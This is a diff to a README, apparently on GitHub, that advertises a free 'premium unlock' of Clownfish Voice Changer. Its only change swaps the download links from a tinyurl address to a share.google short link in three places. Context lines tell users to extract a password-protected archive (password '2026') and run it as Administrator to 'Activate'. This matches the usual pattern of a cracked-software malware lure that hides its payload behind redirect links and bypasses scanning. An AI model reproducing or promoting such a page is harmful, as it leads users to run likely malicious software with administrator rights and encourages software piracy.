@@ -9,7 +9,7 @@
 
 <div align="center">
 
-[![Download Clownfish Voice Changer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/clownfish-voice-changer)
+[![Download Clownfish Voice Changer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/MDnVg5cAquqMaPQnD)
 
 </div>
 
@@ -121,7 +121,7 @@
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Click "Activate" → Launch Clownfish
 
-[![Download Clownfish Voice Changer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/clownfish-voice-changer)
+[![Download Clownfish Voice Changer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/MDnVg5cAquqMaPQnD)
 
 ### Detailed Instructions (May 2026 Update)
 
@@ -264,7 +264,7 @@ Get full Clownfish voice changer premium features for free. **Clownfish Voice Ch
 
 <div align="center">
 
-[![Download Clownfish Voice Changer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/clownfish-voice-changer)
+[![Download Clownfish Voice Changer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/MDnVg5cAquqMaPQnD)
 
 **Version 4.6.1** — Free Clownfish premium unlock. May 2026 update. Zero cost. No payment.
 
